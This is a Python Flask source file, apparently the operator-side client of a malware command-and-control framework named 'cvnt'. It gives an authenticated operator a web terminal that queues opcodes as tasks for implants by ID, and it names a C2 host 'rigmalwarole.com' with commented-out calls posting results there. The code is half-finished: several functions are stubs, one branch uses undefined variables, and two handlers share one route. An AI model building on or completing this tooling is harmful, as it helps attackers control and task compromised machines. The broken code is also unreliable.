from cvnt.implant_pb2 import TaskRequest
from flask import Blueprint, session, render_template, redirect, url_for 
from flask_wtf import FlaskForm 
from wtforms import StringField, SubmitField 
from wtforms.validators import DataRequired, Length 
from cvnt.client_pb2 import *
from urllib.parse import urljoin
from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
from cvnt.constants import opcodes, extras
from cvnt.database import db
from cvnt.db_operations import make_task, get_list, get_implant_by_id

client = Blueprint('client', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/client/task/list"
task_create = "/client/task/create"
register = "/client/register"
request = "/client/request"
response = "/client/response"
packet = "/client/packet"


class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])

@client.route('/client', methods=['GET', 'POST'])
def index():
    form = Terminal()
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    whole = None
    response = None 
    rest_string = ' '
    if form.validate_on_submit():
        whole = form.cmd.data
        words = whole.split()
        if len(words) == 1:
            if words[0] in extras:
                print('printing??????')
                #implants = get_list()
                #for impl in implants:
                    #curr = get_implant_by_id(impl)
                    #lat = curr.latitude
                    #long = curr.longitude
            else:
                response = 'Invalid Command Loser :('
                cmd = words[0]
        elif len(words) == 2:
            if words[1] in opcodes:
                implant_id = words[0]
                cmd = words[1]
                handle_task_request(implant_id, cmd, rest_string)
            else:
                response = 'Invalid Command Loser :('
                cmd = ' '.join(words)
        else:
            if words[1] in opcodes:
                first_two_words = words[:2]
                rest_of_words = words[2:]
                rest_string = ' '.join(rest_of_words)
                handle_task_request(implant_id, cmd, rest_string)
            else:
                response = 'Invalid Command Loser :('  # Set the error message
                cmd = ' '.join(words)
    return render_template('index.html', form=form, cmd=whole, response=response)

def analyze_input(cmd, args):
    pass

def handle_local_request(cmd, args):
    pass
    
def to_opcode(cmd):
    pass

# @client.route('/client/task/request', methods=["POST"])
def handle_task_request(implant_id, cmd, args):
    print(f'REQUEST FROM CLIENT')
    tr = TaskRequest()
    tr.TaskID = "sometaskId idk" # needs to be genrerated
    tr.Opcode = to_opcode(cmd)
    tr.args = args
    new_task = make_task(implant_id, tr)
    print("new task made")
    print(new_task)
    db.session.add(new_task)
    print("added task")
    db.session.commit()
    print("committed task")
    return "True"

@client.route(response, methods=["POST"])
def handle_t_response(implant_id, jobID, output):
    print(f'RESPONSE FROM CLIENT')
    r = ClientTaskResponse()
    r.ImplantID = implant_id
    r.JobID = jobID
    r.Output = output
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, response), data = out)

@client.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, csrf), data = out)
